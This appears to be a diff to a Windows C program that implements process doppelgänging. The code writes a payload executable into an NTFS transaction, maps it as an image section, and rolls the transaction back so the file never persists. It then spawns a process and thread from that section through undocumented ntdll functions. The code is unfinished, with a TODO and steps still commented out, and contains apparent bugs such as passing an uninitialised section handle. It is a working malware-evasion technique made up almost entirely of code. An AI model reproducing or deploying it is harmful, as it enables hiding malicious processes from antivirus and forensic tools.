@@ -2,6 +2,8 @@
 #include <ktmw32.h>
 #include <stdio.h>
 
+#include "proc_dopp.h"
+
 #pragma comment(lib, "KtmW32.lib")
 
 void fatal_error(char *msg)
@@ -56,13 +58,24 @@ LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
 
 int main(void)
 {
+	LPWSTR targetProcess = "C:\\Users\\wvbox\\Desktop\\calc_64.exe";
+	LPWSTR payload = "C:\\Users\\wvbox\\Desktop\\procexp64.exe";
+	HMODULE hNtdll;
 	HANDLE hTransaction;
 	HANDLE hTransactedFile;
-	LPWSTR targetProcess = "C:\\Users\\wvbox\\Desktop\\calc_64.exe";
-	LPWSTR payload = "C:\\Users\\wvbox\\Desktop\\test.txt";
+	HANDLE hSection;
+	HANDLE hProcess;
+	HANDLE hThread;
 	LPVOID lpPayloadBuffer;
 	DWORD payloadSize;
 	DWORD bytesWritten;
+
+	NTSTATUS status;
+	NT_CREATE_SECTION _ntCreateSection;
+	NT_CREATE_PROCESS_EX _ntCreateProcessEx;
+	NT_CREATE_THREAD_EX _ntCreateThreadEx;
+
+	hNtdll = GetModuleHandle("ntdll.dll");
 
 	// Create a transaction.
 	hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
@@ -93,13 +106,71 @@ int main(void)
 
 	WriteFile(hTransactedFile, lpPayloadBuffer, payloadSize, &bytesWritten, NULL);
 
+	// Create the section in the target process.
+	_ntCreateSection = (NT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
+	status = 0;
+	if (_ntCreateSection)
+	{
+		status = _ntCreateSection(
+			hSection,
+			SECTION_ALL_ACCESS,
+			NULL,
+			0,
+			PAGE_READONLY,
+			SEC_IMAGE,
+			hTransactedFile
+		);
+	}
+	if (STATUS_SUCCESS != status)
+		fatal_error("NtCreateSection() failed.");
+
+	// Rollback the transaction to remove our changes from the file system.
+	if (!RollbackTransaction(hTransaction))
+		fatal_error("RollbackTransaction() failed.");
+
+	// Create a new process to wrap the previously created section.
+	_ntCreateProcessEx = (NT_CREATE_PROCESS_EX)GetProcAddress(hNtdll, "NtCreateProcessEx");
+	status = 0;
+	if (_ntCreateProcessEx)
+	{
+		status = _ntCreateProcessEx(
+			&hProcess,
+			PROCESS_ALL_ACCESS,
+			NULL,
+			GetCurrentProcess(),
+			PS_INHERIT_HANDLES,
+			hSection,
+			NULL,
+			NULL,
+			FALSE
+		);
+	}
+	if (STATUS_SUCCESS != status)
+		fatal_error("NtCreateProcessEx() failed.");
+
+	// Create the main thread for the new process.
+	_ntCreateThreadEx = (NT_CREATE_THREAD_EX)GetProcAddress(hNtdll, "NtCreateThreadEx");
+	status = 0;
+	if (_ntCreateThreadEx)
+	{
+		status = _ntCreateThreadEx(
+			&hThread,
+			THREAD_ALL_ACCESS,
+			NULL,
+			hProcess,
+			// TODO : understand the process/thread parameter setup,
+			NULL,
+			FALSE,
+			0,
+			0,
+			0,
+			NULL
+		);
+	}
+	if (STATUS_SUCCESS != status)
+		fatal_error("NtCreateThreadEx() failed.");
+
 	/*
-	NtCreateSection();
-	RollbackTransaction();
-
-	NtCreateProcessEx();
-	NtCreateThreadEx();
-
 	RtlCreateProcessParameters();
 
 	VirtualAllocEx();
